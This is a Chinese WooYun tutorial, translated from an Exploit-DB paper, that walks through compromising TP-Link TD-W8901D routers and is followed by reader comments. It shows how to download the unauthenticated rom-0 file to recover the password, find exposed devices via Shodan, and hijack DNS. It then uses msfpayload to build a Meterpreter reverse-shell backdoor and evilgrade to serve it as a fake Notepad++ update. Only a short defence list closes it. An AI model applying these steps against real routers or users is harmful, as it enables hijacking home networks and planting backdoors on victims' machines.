<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">TPLINK渗透实战</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">楚无伤</a> <span class="bull">·</span> <time title="2014/07/16 10:32" ui-time="" datetime="2014/07/16 10:32" class="published ng-binding ng-isolate-scope">2014/07/16 10:32</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p><strong>from: http://www.exploit-db.com/wp-content/themes/exploit/docs/33369.pdf</strong></p><h2>0x00 工具</h2><hr><p>一台笔记本电脑 TD-W8901D路由器（firmware 6.0.0） 虚拟机(WIN7)、Kali Linux（攻击机）、evilgrade（一个模块化的脚本框架，可实现伪造的升级、自带DNS和WEB服务模块，http://www.infobyte.com.ar/down/isr-evilgrade-Readme.txt) Metasploit。</p><h2>0x01 示例</h2><hr><p><strong>互联网攻击示意图：</strong></p><p><img alt="enter image description here" img-src="e0c6c8f6f9d6b6717a0d5e1dd358d690591c8513.jpg"></p><p><strong>局域网攻击示意图</strong></p><p><img alt="enter image description here" img-src="e0cdfcc988e1b8ea53ae92a093f48f243c3eb583.jpg"></p><p>市场上有很多类型的路由器可用，但绝大部分从未升级固件，所以可对大多数家用路由进行这个攻击，在这个项目中使用的是最常见的TPlink路由器。</p><p>TPLINK某些版本有一个关键的漏洞：未授权访问Firmware/Romfile界面，无需登陆密码，像这样http://IP//rpFWUpload.html。</p><p>同时也可以下载romfile备份文件（rom-0）,像这样：http://IP address/rom-0。</p><p>步骤一：下载rom文件 <img alt="enter image description here" img-src="d8b8ce3bfaa815e441bf1a39a4632312901737d5.jpg"></p><p>下载回来的rom文件需要逆向工程得到明文密码，但有一个更简单的方法，去俄罗斯的一个网站可以解密 http://www.hakim.ws/huawei/rom-0/</p><p>步骤二：使用账号密码登陆 <img alt="enter image description here" img-src="f7697aa0a2242fb62f09df8c3f56975af092e967.jpg"></p><p>第三步：使用搜索引擎SHODAN 搜索RomPager，可在互联网上找到700多万个这种设备 <img alt="enter image description here" img-src="9adf04fd5f2643ce33407366780e9a6dc7cf0eb2.jpg"></p><p>简单的改变一下路由器的DNS，就可以重定向用户的请求，这个方法可以用来钓鱼（从我了解的情况看来，国内已经有大批路由被利用，并已经被黑产用作钓鱼欺诈，黑产表打我，我猜的）。但这个太简单了，作者希望玩的更高(hua)深(shao)一些。</p><p>默认DNS的配置是这样： <img alt="enter image description here" img-src="d0850c44c24db1e6ff0c188d75d9636f6ba95fa0.jpg"></p><p>改成攻击者自己的DNS：</p><p><img alt="enter image description here" img-src="7aa8487f0df0c14f0363ecca2bd1f5260c08bbc4.jpg"></p><p>攻击系统：DNS服务器一台、kali预装了evilgrade 和metasploit。</p><p><img alt="enter image description here" img-src="a97b422be089269e5bc32558dcbaafd4334cbe62.jpg"></p><p>第五步：建一个带后门的payload，给用户发送升级指令。LHOST= 攻击者机器IP和 LPORT =任何开放的端口。</p><pre><code>Commad:@@# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.5.132 LPORT=8080 x &gt; navebackdoor.exe 
</code></pre><p><img alt="2014071323521922657.jpg" img-src="d283d8879f7a3f653e6a8960e7f5b131d81d4a66.jpg"></p><p>第六步：启动metasploit、运行payload</p><p><img alt="2014071323523583152.jpg" img-src="a3fd17d75be249e2ee98abfbc994f741fba0e1e9.jpg"></p><p><img alt="2014071323530565178.jpg" img-src="3f8812694ee30ca9fd2611beed2fa0a9a19b87e9.jpg"></p><p><img alt="2014071323531775176.jpg" img-src="554cb411ff5891f51bc2f9309fad2f0de9a4c909.jpg"></p><p>第七步：设置监听主机和监听端口，命令：set LHOST（攻击者的IP）、set LPORT（监听端口，创建后门时分配的）、exploit（进行攻击）</p><p><img alt="2014071323533763041.jpg" img-src="feb5c76ce9c5fd54fd7b3e0ae3f85b94d302110f.jpg"></p><p>第八步：启动假的WEB升级服务器evilgrade，执行show modules后，可以看到很多假更新模块，这里选用notepadplus</p><p><img alt="2014071323535610035.jpg" img-src="3783638f23050cb9e6511a55a312366058923488.jpg"></p><p><img alt="2014071323541051845.jpg" img-src="68f416f65bac8f390661ea621f903804b2d03927.jpg"></p><p><img alt="2014071323542812615.jpg" img-src="562b094514d48bf66ce04d24f96759435fcc2ddb.jpg"></p><p>第九步：show options可以看到模块的使用方法，设置后门升级文件路径使用agent：</p><pre><code>Set  agent  ‘[“&lt;%OUT%&gt;/root/Desktop/navebackdoor.exe&lt;%OUT%&gt;”]’ 
</code></pre><p><img alt="2014071323544287175.jpg" img-src="246c376a97fad4096518e7e3197550406de9db44.jpg"></p><p>第十步：完成以上动作后，启动EvilGrade的WEB服务器：</p><pre><code>start
</code></pre><p><img alt="2014071323550126547.jpg" img-src="81f3c0b9f7499f5761c8fcf3cf2f90082b87f2ba.jpg"></p><p>第十一步：等受害者打开notepadplus，一旦打开就会弹出要求更新的提示，更新过程中将会加载我们的后门程序。</p><p><img alt="2014071323551940538.jpg" img-src="81f38080a2f6972084577ec80fccee4dcc85c526.jpg"></p><p><img alt="2014071323553365266.jpg" img-src="d2e62c3f1a5c1956b783075f8920057296dbca59.jpg"></p><p>第十二步：在攻击机器上，evilgrade和Metasploit建立会话，等待返回的shell</p><p><img alt="2014071323554774816.jpg" img-src="f8d927eaa8578dbe48466b433fc48b3aa311ab3b.jpg"></p><p>第十三步：拿到shell，使用sysinfo查看一下：</p><p><img alt="2014071323560039521.jpg" img-src="6c08337533bba0ccd4ce6ee899572255d56615ef.jpg"></p><p>输入help可以看到很多命令，包括scrrenshot、killav,运行vnc 等</p><p><img alt="2014071323561637433.jpg" img-src="0b2d34c65566f171b1d4fe9cc9a4997a17017fcd.jpg"></p><p><img alt="2014071323563672357.jpg" img-src="9655d956ed19847d0d29efc05182d6626fa3e0dc.jpg"></p><h2>0x02 防御方法</h2><hr><p>经常升级你的路由器版本</p><p>路由器不要在公网暴露</p><p>系统和软件升级时检查证书</p><p>设置静态IP，比如google的8.8.8.8、8.8.4.4（广告：阿里巴巴的公共dns 223.5.5.5 和 223.6.6.6）</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/5234" rel="bookmark" id="re1">内网渗透随想</a></li><li><a href="http://drops.wooyun.org/tips/3353" rel="bookmark" id="re2">Powershell tricks::Bypass AV</a></li><li><a href="http://drops.wooyun.org/tips/8971" rel="bookmark" id="re3">通过DNS TXT记录执行powershell</a></li><li><a href="http://drops.wooyun.org/papers/4386" rel="bookmark" id="re4">One git command may cause you hacked(CVE-2014-9390)</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">LaTCue</span> <span class="reply-time">2016-06-19 17:18:15</span></div><p></p><p>@aaa 然而电信没有给我公网IP 2333</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2015-11-19 21:31:08</span></div><p></p><p>xuexi le</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">特恩奥傅</span> <span class="reply-time">2014-07-21 18:20:52</span></div><p></p><p>厉害</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">HackBraid</span> <span class="reply-time">2014-07-21 11:10:48</span></div><p></p><p>这个厉害，学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">acfuner</span> <span class="reply-time">2014-07-20 02:08:07</span></div><p></p><p>。。。tplink漏洞，如果其他路由器呢，这运气有些屌</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">fuckadmin</span> <span class="reply-time">2014-07-17 15:55:38</span></div><p></p><p>http://www.exploit-db.com/wp-content/themes/exploit/docs/33369.pdf<br>我是活雷峰~~~~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">3xpl0it</span> <span class="reply-time">2014-07-17 14:21:29</span></div><p></p><p>老大，你太厉害了。亲一个。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Anymous</span> <span class="reply-time">2014-07-17 12:39:04</span></div><p></p><p>只能伪造notepad++的更新吗？<br>某数字会检查DNS吧？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zzR</span> <span class="reply-time">2014-07-17 08:44:07</span></div><p></p><p>洞主玩的好溜~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Cc.</span> <span class="reply-time">2014-07-17 01:53:08</span></div><p></p><p>啊哈哈哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">aaa</span> <span class="reply-time">2014-07-17 01:33:13</span></div><p></p><p>"路由器不要在公网暴露"这个有点难</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">kider</span> <span class="reply-time">2014-07-16 21:43:23</span></div><p></p><p>2013左右的路由都不存在着几个洞子了，，表示鸡肋了。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-07-16 20:03:34</span></div><p></p><p>@_@</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zeracker</span> <span class="reply-time">2014-07-16 17:46:21</span></div><p></p><p>洞主来参加众测吧。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">enen</span> <span class="reply-time">2014-07-16 15:53:11</span></div><p></p><p>不错，赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Bloodwolf</span> <span class="reply-time">2014-07-16 13:26:08</span></div><p></p><p>话说直接set一下，就玩事了。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">◕‿◕</span> <span class="reply-time">2014-07-16 10:40:29</span></div><p></p><p>哈哈呵呵 第一楼 这个不错</p><p></p></div></div></div></div></div></main>